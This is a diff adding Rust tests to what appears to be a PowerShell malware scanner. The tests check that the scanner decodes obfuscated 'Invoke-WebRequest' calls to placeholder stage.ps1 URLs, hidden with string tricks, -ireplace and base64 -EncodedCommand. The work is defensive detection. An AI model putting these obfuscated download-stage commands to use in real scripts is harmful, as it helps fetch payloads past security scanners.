@@ -24330,6 +24330,94 @@ Add 0 '{}' 6 '-'"#,
     }
 
     #[test]
+    fn ps1_normalization_decodes_literal_tail_substring_extractor_call() {
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-tail-substring-extractor.example/stage.ps1";
+        let ps = format!(
+            r#"function Tail($value,$start) {{
+  return $value.Substring($start)
+}}
+Tail 'zz{decoded}' 2"#
+        );
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+
+        assert!(
+            normalized.contains(
+                "'Invoke-WebRequest -Uri https://ps-tail-substring-extractor.example/stage.ps1'"
+            ),
+            "literal tail substring extractor call was not normalized:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
+    fn ps1_normalization_decodes_literal_remove_extractor_call() {
+        let decoded = "Invoke-WebRequest -Uri https://ps-remove-extractor.example/stage.ps1";
+        let ps = r#"function Cut($value,$start,$count) {
+  return $value.Remove($start,$count)
+}
+Cut 'Invoke-JUNKWebRequest -Uri https://ps-remove-extractor.example/stage.ps1' 7 4"#;
+        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
+
+        assert!(
+            normalized.contains(&format!("'{decoded}'")),
+            "literal remove extractor call was not normalized:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
+    fn ps1_normalization_decodes_literal_tail_remove_extractor_call() {
+        let decoded = "Invoke-WebRequest -Uri https://ps-tail-remove-extractor.example/stage.ps1";
+        let start = decoded.len();
+        let ps = format!(
+            r#"function CutTail($value,$start) {{
+  return $value.Remove($start)
+}}
+CutTail '{decoded}JUNK' {start}"#
+        );
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+
+        assert!(
+            normalized.contains(&format!("'{decoded}'")),
+            "literal tail remove extractor call was not normalized:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
+    fn ps1_normalization_decodes_literal_insert_extractor_call() {
+        let decoded = "Invoke-WebRequest -Uri https://ps-insert-extractor.example/stage.ps1";
+        let ps = r#"function Add($value,$start,$text) {
+  return $value.Insert($start,$text)
+}
+Add 'InvokeWebRequest -Uri https://ps-insert-extractor.example/stage.ps1' 6 '-'"#;
+        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
+
+        assert!(
+            normalized.contains(&format!("'{decoded}'")),
+            "literal insert extractor call was not normalized:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
+    fn ps1_normalization_decodes_literal_string_case_extractor_call() {
+        let ps = r#"function Lower($value) {
+  return $value.ToLower()
+}
+Lower 'INVOKE-WEBREQUEST -URI HTTPS://PS-LOWER-EXTRACTOR.EXAMPLE/STAGE.PS1'"#;
+        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
+
+        assert!(
+            normalized
+                .contains("'invoke-webrequest -uri https://ps-lower-extractor.example/stage.ps1'"),
+            "literal string-case extractor call was not normalized:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
     fn ps1_ireplace_literal_resolves_url() {
         let inner =
             r#"Invoke-WebRequest -Uri ('hxxps://ps-ireplace.example/stage' -ireplace 'xx','tt')"#;
@@ -24345,6 +24433,30 @@ Add 0 '{}' 6 '-'"#,
             }),
             "PowerShell -ireplace URL was not deobfuscated: {:?}",
             report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_ireplace_literal_is_case_insensitive() {
+        use base64::Engine;
+
+        let inner = r#"Invoke-WebRequest -Uri ('hXXps://ps-ireplace-ci.example/stage' -ireplace 'xx','tt')"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("https://ps-ireplace-ci.example/stage"),
+            "PowerShell -ireplace should normalize case-insensitive replacement: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
         );
     }
 
